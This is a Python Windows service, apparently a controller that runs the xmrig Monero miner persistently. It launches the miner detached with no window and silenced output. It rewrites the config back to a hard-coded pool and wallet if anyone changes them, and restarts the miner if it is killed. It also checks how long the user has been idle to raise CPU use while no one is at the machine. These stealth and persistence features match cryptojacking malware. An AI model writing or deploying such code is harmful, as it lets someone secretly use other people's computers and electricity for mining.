import win32service
import win32serviceutil
import win32event
import win32timezone
import sys,json,win32evtlog,win32evtlogutil,servicemanager,subprocess,win32process,psutil,win32api
from logging.handlers import RotatingFileHandler
import logging
import time
import threading
from pathlib import Path

class LSoftware(win32serviceutil.ServiceFramework):
    _svc_name_ = "LSoftware"
    _svc_display_name_ = "LMiner"
    _svc_description_ = "Controlador de Minero :3"


    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self,args)

        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.worker = None
        self.Activemode = None
        self.loger = None
    
    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)

        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self._bootstrap()
        except Exception as e:
            servicemanager.LogErrorMsg(f"Bootstrap failed: {e}")
            self.ReportServiceStatus(win32service.SERVICE_STOPPED)
            return
        self.worker = threading.Thread(
            target=self.main
        )
        self.worker.start()

        while True:
            rc = win32event.WaitForSingleObject(self.stop_event, 1000)
            if rc == win32event.WAIT_OBJECT_0:
                break

        self.ReportServiceStatus(win32service.SERVICE_STOPPED)
    
    def main(self):
        try:
            self.loger.info("Loger iniciado...")
            self.loger.info("Servicio iniciado")

            self.loger.info("Comprobando Minador")

            mina = self.Rprincipal / "xmrig.exe"
            config = self.Rprincipal / "config.json"
            
            if config.exists() and config.is_file():
                self.loger.info("Archivo de configuracion del Minador encontrado correctamente")
                self.loger.info("Comprobando configuracion")

                try:
                    with open(config,"r",encoding="utf-8") as f:
                        data = json.load(f)
                    self.loger.info("Archivo de configuracion cargado correctamente")

                    if data["cpu"]["enabled"] == True and data["cpu"]["max-threads-hint"] == 30:
                        self.loger.info("STEP1:Configurado correctamente")
                    else:
                        self.loger.error("STEP1:Modificado cambiando...")

                        data["cpu"]["enabled"] = True
                        data["cpu"]["max-threads-hint"] = 30

                        with open(config,"w",encoding="utf-8") as f:
                            json.dump(data,f,indent=2)
                        self.loger.info("STEP1:Cargado correctamente")

                    pool = data["pools"][0]
                    if pool["url"] == "gulf.moneroocean.stream:10128" and pool["user"] == "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB":
                        self.loger.info("STEP2:Configurado correctamente")
                    else:
                        self.loger.error("STEP2:Modificado cambiando...")

                        data["pools"][0]["url"] = "gulf.moneroocean.stream:10128"
                        data["pools"][0]["user"] = "4AvbCFq5t8TL7cbYV9RJFxCTahXHtVaYn944ygGsfg1hTE9SPgBmCtWX9hdaJ59hHsdtGUdVSYayg6Mp21Mct5Dh4abJtpB"

                        with open(config,"w",encoding="utf-8") as f:
                            json.dump(data,f,indent=2)
                        
                        self.loger.info("STEP2:Cargado correctamente")
                    self.loger.info("Configuracion de minero cargada correctamente")
                except Exception as e:
                    self.loger.error(f"Archivo de configuracion no se pudo cargar correctamente: {e} ")
            else:
                self.loger.critical("Archivo de configuracion no encontrado...")
                win32event.SetEvent(self.stop_event)

            if mina.exists() and mina.is_file():
                self.loger.info("Executable del minador encontrado correctamente")
                self.loger.info("Cargando Minador")

                Minador = self.Encontrador(mina)
                if Minador:
                    self.loger.info("Se detecto que el minador esta corriendo...")
                    self.loger.info(f"Deteniendo servicio no supervisado pid:{Minador.pid} name:{Minador.name}")

                    self.RutB(Minador)
                else:
                    try:
                        self.Exececutor()
                        if self.xmrig.poll() is None:
                            self.loger.info("Minador Iniciado correctamente")
                        else:
                            self.loger.critical("Minador fue eliminado")
                            win32event.SetEvent(self.stop_event)
                    except Exception as e:
                        self.loger.error(f"Hubo un error al intentar iniciar el minador: {e}")
                        win32event.SetEvent(self.stop_event)

                    self.RutA()
                    
            else:
                self.loger.critical("Archivo executable del minador no existe...")
                win32event.SetEvent(self.stop_event)
        except Exception as e:
            self.loger.critical(f"ERROR:{e}")
            win32event.SetEvent(self.stop_event)

    def SvcStop(self):
        self.loger.info("Solicitud de parada recibida")
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)

        # 1️⃣ avisar
        win32event.SetEvent(self.stop_event)

        # 2️⃣ esperar al hilo
        if self.worker and self.worker.is_alive():
            self.worker.join(timeout=10)

        # 3️⃣ matar xmrig si sigue vivo
        try:
            if hasattr(self, "xmrig") and self.xmrig.poll() is None:
                self.xmrig.terminate()
                self.xmrig.wait(timeout=5)
        except Exception as e:
            self.loger.error(f"Error al detener xmrig: {e}")

        self.loger.info("Servicio detenido correctamente")
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

    def _bootstrap(self):
        if getattr(sys, 'frozen', False):
            self.Master = Path(sys.executable).parent
        else:
            self.Master = Path(__file__).resolve().parent

        self.Rprincipal = self.Master / "xmrig-6.25.0"

        log = self.Master / "logs"

        self.Activemode = "BAJ"
        
        if log.exists() and log.is_dir():
            pass
        else:
            log.mkdir(exist_ok=True)

        loggerI = log / "minerlog.log"
        loggerC = log / "CRITICALMinerlog.log"

        self.loger = logging.getLogger("LMiner")
        self.loger.setLevel(logging.INFO)
        self.loger.propagate = False
        self.logI = RotatingFileHandler(
            filename=loggerI,
            maxBytes=2_000_000,
            backupCount=3
        )
        self.logI.setLevel(logging.INFO)
        self.logC = RotatingFileHandler(
            filename=loggerC,
            maxBytes=2_000_000,
            backupCount=2
        )
        self.logC.setLevel(logging.CRITICAL)


        formato = logging.Formatter(
            "%(asctime)s | %(levelname)s | %(message)s"
        )
        if self.loger.hasHandlers():
            self.loger.handlers.clear()
        for h in (self.logI,self.logC):
            h.setFormatter(formato)
            self.loger.addHandler(h)

    def Encontrador(self, pathsor=None):
        for p in psutil.process_iter(["pid", "name", "exe"]):
            try:
                if p.info["name"] and p.info["name"].lower() == "xmrig.exe":
                    if pathsor:
                        if p.info["exe"] and Path(p.info["exe"]).resolve() == Path(pathsor).resolve():
                            return p
                    else:
                        return p
            except psutil.AccessDenied:
                self.loger.warning(f"Acceso denegado a un proceso pid:{p.pid}, continuando búsqueda...")
                continue
            except psutil.NoSuchProcess:
                continue
            except Exception as e:
                self.loger.error(f"Error inesperado en Encontrador: {e}")
                continue
        return None
            
    def RutA(self):
        self.loger.info("Empezando supervicion")

        configCH = self.Rprincipal / "config.json"
        while True:
            ac1 =win32event.WaitForSingleObject(self.stop_event,1000)
            if ac1 == win32event.WAIT_OBJECT_0:
                self.loger.info("Servicio detenido...")
                break


            if self.xmrig.poll() is None:
                continue
            else:
                self.loger.warning("El proceso se termino volviendo a ejecutar...")
                try:
                    self.Exececutor()
                    self.loger.info("Se logro volver a ejecutar exitosamente")
                except Exception as e:
                    self.loger.critical(f"{e}")
                    win32event.SetEvent(self.stop_event)

            first_input = win32api.GetLastInputInfo()
            tick_ac = win32api.GetTickCount()

            timems = tick_ac - first_input

            if timems > 10_000:
                self.loger.info("Cambiando a modo ALTO")


                with open(configCH,"r",encoding="utf-8") as f1:
                    data = json.load(f1)

                cpu_use = psutil.cpu_percent(interval=None)

                maxcpu = 100 - cpu_use
                if maxcpu > 50:
                    data["cpu"]["max-threads-hint"] = 50
                elif maxcpu > 40:
                    data["cpu"]["max-threads-hint"] = 40
                
                with open(configCH,"w",encoding="utf-8") as f2:
                    json.dump(data,f2,indent=2)
                
                self.xmrig.terminate()

                time.sleep(2)

                if self.xmrig.poll() is not None:
                    self.loger.info("Reiniciando el Minador en modo ALTO")
                    try:
                        self.Exececutor()
                        self.Activemode = "ALT"
                    except Exception as e:
                        self.loger.critical(f"{e}")
                        win32event.SetEvent(self.stop_event)
                else:
                    self.loger.warning("El proceso re reuso... intentando terminar")

                    self.xmrig.kill()

                    try:
                        self.Exececutor()
                        self.Activemode = "ALT"
                    except Exception as e:
                        self.loger.critical(f"{e}")
                        win32event.SetEvent(self.stop_event)
            else:
                with open(configCH,"r",encoding="utf-8") as f2:
                    data = json.load(f2)
                

                if data["cpu"]["max-threads-hint"] > 40 and self.Activemode == "ALT":
                    self.loger.info("Cambiando a modo BAJO")


                    data["cpu"]["max-threads-hint"] = 40

                    self.Activemode = "BAJ"

                    with open(configCH,"w",encoding="utf-8") as f3:
                        json.dump(data,f3,indent=2)
                    
                    self.loger.info("Reiniciando minador")

                    try:
                        self.Exececutor()
                        self.loger.info("Minador reiniciado empezando minado a BAJO")
                    except Exception as e:
                        self.loger.critical(f"ERROR:{e}")
                        win32event.SetEvent(self.stop_event)

    def RutB(self,Process1:psutil.Process):
        Process1.terminate()

        try:
           Process1.wait(timeout=5)

           self.loger.info("Proceso terminado adecuadamente")
        except psutil.TimeoutExpired:
           self.loger.error("Proceso se reuso terminando...")
           Process1.kill()
        except psutil.AccessDenied:
            self.loger.error("Acceso denegado")
            win32event.SetEvent(self.stop_event)
        self.loger.info("Reiniciando Minador")
        try:
            self.Exececutor()
        except Exception as e:
            self.loger.critical(f"Problema al intentar ejecutar el minador: {e}")
            win32event.SetEvent(self.stop_event)
        self.RutA()

    def Exececutor(self):
        
        flags = (
            win32process.CREATE_NEW_PROCESS_GROUP |
            win32process.DETACHED_PROCESS |
            subprocess.CREATE_NO_WINDOW
        )
        mina1 = self.Rprincipal / "xmrig.exe"
        config1 = self.Rprincipal / "config.json"

        self.xmrig = subprocess.Popen(
            [mina1,"--config",config1],
            cwd=self.Rprincipal,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=flags,
            close_fds=True
        )
        

if __name__ == "__main__":
    win32serviceutil.HandleCommandLine(LSoftware)